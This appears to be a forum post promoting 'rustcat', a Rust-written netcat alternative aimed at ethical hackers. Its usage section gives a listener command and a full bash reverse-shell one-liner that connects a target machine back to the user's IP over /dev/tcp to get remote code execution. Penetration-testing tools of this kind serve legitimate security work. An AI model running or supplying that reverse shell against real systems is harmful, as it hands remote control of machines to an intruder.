New Netcat Alternative Made In Rust For Ethical Hackers
As you guys may know **netcat** is a thing... I pretty old thing.

So I decided to make a newer more modern netcat alternative in rust (**rustcat**)

[Example](https://preview.redd.it/arsl2vp3cm371.png?width=295&format=png&auto=webp&s=131d60f8479aabf4ea8196cfe27841d991fa268c)

Why should you use rustcat instead of netcat:

* It is more modern
* Made in rust
* Has colors to make it fancier
* Daily Maintained

How to get a rce with it?

* Start up a listner on specified port ex. (rc -lp 55600)
* Open a reverse shell on a target machine with for example(/bin/bash -c 'bash -i >& /dev/tcp/your-ip-running-the-listener/55600 0>&1')
* Boom you got yourself a nice rce  


More features will be added in the future.Also remember to give the repo a star‚≠ê and create a issue if you have an **idea** or **find a bug**
